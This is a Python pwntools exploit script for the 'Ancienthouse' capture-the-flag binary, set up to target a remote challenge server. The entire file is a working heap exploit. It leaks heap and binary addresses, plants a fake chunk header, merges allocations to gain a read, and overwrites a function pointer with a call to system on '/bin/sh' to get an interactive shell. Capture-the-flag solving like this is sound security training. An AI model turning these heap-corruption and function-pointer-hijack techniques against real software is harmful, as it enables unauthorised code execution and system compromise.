#!/usr/bin/python3

from pwn import *

context.terminal = 'tmux split -h'.split(' ')
# context.log_level = 'debug'

PLAYER = b'/bin/sh'
elf = ELF('./Ancienthouse', checksec=False)

if args.REMOTE:
    p = remote('pwn.challenge.bi0s.in', 1230)
else:
    p = process(elf.path)
    if args.GDB:
        gdb.attach(p, '''
            brva 0x1ba1
            continue
            ''')

def choose(choice):
    p.sendlineafter(b'>> ', str(choice).encode())

def add(size, name):
    choose(1)
    p.sendlineafter(b'size : ', str(size).encode())
    p.sendafter(b'name : ', name)

def battle(index, choice = 1):
    choose(2)
    p.sendlineafter(b'id : ', str(index).encode())
    p.recvuntil(b'with ')
    leak = p.recvuntil(b' ')[:-1]

    p.recvuntil(b'remaining : ')
    health = int(p.recvline())

    if health <= 0:
       p.sendlineafter(b'>>', str(choice).encode())
    return leak

def merge(one, two):
    choose(3)
    p.sendlineafter(b'1: ', str(one).encode())
    p.sendlineafter(b'2: ', str(two).encode())

def bye():
    choose(4)

# 1. Set player name
p.sendafter(b': ', PLAYER)

# 2. Initial configuration
add(0x20, b'A' * 0x20)
add(0x10, b'B' * 0x10)

# 3. Leak heap address
leak = battle(0)
leak_addr = u64(leak[0x20:].ljust(8, b'\x00'))
target_addr = (leak_addr & 0xffffffffffff0000) + 0x8060
player_addr = (leak_addr & 0xffffffffffff0000) + 0x7040

log.info(f'leak = {hex(leak_addr)}')
log.info(f'target @ {hex(target_addr)}')
log.info(f'player @ {hex(player_addr)}')

# 4. Kill enemy #0
for _ in range(6):
    battle(0)

add(0x20, b'C' * 0x10 + b'\x00' * 0x10)
add(0x10, b'D' * 0x10)

# 5. Kill enemy #2
for _ in range(7):
    battle(2)

# 6. Add enemy with fake_header as name
fake_header = p64(target_addr) + p32(8) + p32(0)
add(0x10, fake_header)

# 7. Merge enemies #1 and #3
merge(1, 3)

# 8. Leak binary base address
leak = battle(1)
leak_addr = u64(leak.ljust(8, b'\x00'))
bin_addr = leak_addr - 0x1b82
call_addr = bin_addr + 0x1170

log.info(f'leak = {hex(leak_addr)}')
log.info(f'bin @ {hex(bin_addr)}')
log.info(f'call system @ {hex(call_addr)}')

# 9. Overwrite function ptr and its argument
add(0x50, p64(call_addr) + p64(player_addr))

# 10. Goodbye?
bye()

p.interactive()
